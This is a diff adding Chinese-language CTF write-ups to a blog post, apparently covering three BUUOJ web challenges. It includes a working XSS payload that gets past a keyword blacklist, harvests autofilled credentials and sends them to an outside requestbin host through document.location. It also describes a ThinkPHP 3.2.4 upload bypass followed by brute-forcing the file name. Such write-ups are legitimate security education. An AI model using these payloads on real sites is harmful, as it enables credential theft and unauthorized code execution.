@@ -140,3 +140,136 @@ while True:
 
 ## [GWCTF 2019]mypassword
 
+随便注册一个用户登录, 然后看到 Feedback, 右键注释如下
+
+```php
+if(is_array($feedback)){
+    echo "<script>alert('反馈不合法');</script>";
+    return false;
+}
+$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
+foreach ($blacklist as $val) {
+    while(true){
+        if(stripos($feedback,$val) !== false){
+            $feedback = str_ireplace($val,"",$feedback);
+        }else{
+            break;
+        }
+    }
+}
+```
+
+随便写一点内容, 提交后去 List 查看, 发现 response header
+
+```
+Content-Security-Policy: default-src 'self';script-src 'unsafe-inline' 'self'
+```
+
+猜测是 xss bypass CSP
+
+上面的黑名单绕过逻辑有点问题, 这里可以通过添加某个关键词来绕过该关键词前面的内容
+
+即往 input script src 这些单词里面插入 cookie 可以绕过, 但是 cookie 关键词本身绕不过去, 无法获取 `document. cookie` 的内容
+
+之后发现登录界面引用了一个 js 文件
+
+```javascript
+if (document.cookie && document.cookie != '') {
+	var cookies = document.cookie.split('; ');
+	var cookie = {};
+	for (var i = 0; i < cookies.length; i++) {
+		var arr = cookies[i].split('=');
+		var key = arr[0];
+		cookie[key] = arr[1];
+	}
+	if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
+		document.getElementsByName("username")[0].value = cookie['user'];
+		document.getElementsByName("password")[0].value = cookie['psw'];
+	}
+}
+```
+
+到这里思路就很清晰了, 我们可以间接获取 cookie 的内容, 即先插入两个 input 表单并引用此 js 文件, 然后通过 dom 获取 username password, 最后绕过 csp 外带数据
+
+绕过 csp 的方法很多, 下面以 `document.location` 为例
+
+```html
+<incookieput type="text" name="username">
+<incookieput type="password" name="password">
+
+<scrcookieipt scookierc="/js/login.js"></sccookieript>
+<scrcookieipt>
+	var username = docucookiement.getEcookielementsByName("username")[0].value;
+    var password = doccookieument.getEcookielementsByName("password")[0].value;
+    var  data = username + ":" + password;
+    docookiecument.locacookietion = "http://http.requestbin.buuoj.cn/xxxx?data=" + data;
+</scrcookieipt>
+```
+
+最后在 buu requestbin 上查看 flag
+
+![image-20221130154432464](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211301544573.png)
+
+## [RootersCTF2019]babyWeb
+
+简单报错注入
+
+![image-20221130155328561](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211301553622.png)
+
+## [RoarCTF 2019]Simple Upload
+
+thinkphp 3.2.4
+
+```php
+<?php
+namespace Home\Controller;
+
+use Think\Controller;
+
+class IndexController extends Controller
+{
+    public function index()
+    {
+        show_source(__FILE__);
+    }
+    public function upload()
+    {
+        $uploadFile = $_FILES['file'] ;
+        
+        if (strstr(strtolower($uploadFile['name']), ".php") ) {
+            return false;
+        }
+        
+        $upload = new \Think\Upload();// 实例化上传类
+        $upload->maxSize  = 4096 ;// 设置附件上传大小
+        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
+        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
+        $upload->savePath = '';// 设置附件上传子目录
+        $info = $upload->upload() ;
+        if(!$info) {// 上传错误提示错误信息
+          $this->error($upload->getError());
+          return;
+        }else{// 上传成功 获取上传文件信息
+          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
+          echo json_encode(array("url"=>$url,"success"=>1));
+        }
+    }
+}
+```
+
+试了一圈后发现并没有限制上传白名单, 后来看了文档发现人家的参数是 exts, 所以根本就没有 allowExts 这个参数
+
+[https://www.kancloud.cn/manual/thinkphp/1876](https://www.kancloud.cn/manual/thinkphp/1876)
+
+继续看文档发现上传单文件是 uploadOne, 上传多文件是 upload, 那么这里就可以构造多个 file 表单上传, 只是返回不了文件地址 (代码中仅输出 `$info['file']['savepath']` 这一条路径)
+
+思路就是同时上传 A B(PHP), 然后爆破得出 PHP 文件的路径, 或者是依次上传 A B(PHP) A 这种方式得到文件名的范围
+
+thinkphp 3 默认用 uniqid 函数来生成文件名, 其实就是微秒级别的时间戳, 但是注意会出现 a b c d e f 这几个字母
+
+最后按照上面的思路上传后爆破文件名得到 flag
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211301726338.png)
+
+## [HFCTF2020]BabyUpload
+
